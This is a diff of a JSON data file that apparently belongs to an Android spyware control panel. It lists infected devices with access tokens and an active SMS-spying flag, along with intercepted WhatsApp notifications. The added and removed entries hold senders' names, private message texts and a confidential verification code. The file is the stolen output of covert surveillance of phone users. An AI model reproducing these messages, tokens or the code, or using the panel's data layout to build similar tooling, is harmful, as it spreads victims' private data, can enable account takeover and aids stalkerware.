@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776771497782,
+    "lastSeen": 1776771500901,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -20,6 +20,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Adi Wirayuda W",
+        "content": "Naya kindang mendok duit",
+        "time": "21/04 19:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776771501557
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎HK-dept KPP-INDE/KHVR (5 pesan): Adam Hk",
+        "content": "Di copy pak",
+        "time": "21/04 19:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776771500661
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Adi Wirayuda W",
+        "content": "Naya kindang mendok duit",
+        "time": "21/04 19:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776771500544
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Seleksi Host VIP Agency (3 pesan): ~ kyan kw",
+        "content": "Menyebut grup Anda secara privat di status",
+        "time": "21/04 19:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776771500466
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "defra",
+        "content": "okee oke nyelesain ini",
+        "time": "21/04 19:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776771500387
+      },
       {
         "appName": "WhatsApp",
         "sender": "prily 🤍",
@@ -3979,46 +4019,6 @@
         "time": "21/04 17:13",
         "pkg": "com.whatsapp",
         "receivedAt": 1776762797761
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "prily 🤍",
-        "content": "💟 Stiker",
-        "time": "21/04 17:13",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776762797755
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎ZPSX ROBLOX (10 pesan): ~ liyudzha nurul gina",
-        "content": "Menyebut grup Anda secara privat di status",
-        "time": "21/04 17:13",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776762797751
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "TelConnect",
-        "content": "[Verify] 467427. Ini adalah informasi rahasia, jangan bagikan kepada siapa pun.",
-        "time": "21/04 17:13",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776762797747
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "HAIDIR hk",
-        "content": "Kenapa",
-        "time": "21/04 17:13",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776762797740
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Kelvin",
-        "content": "Ada kgk?",
-        "time": "21/04 17:13",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776762797082
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776771497691,
+    "lastSeen": 1776771500543,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
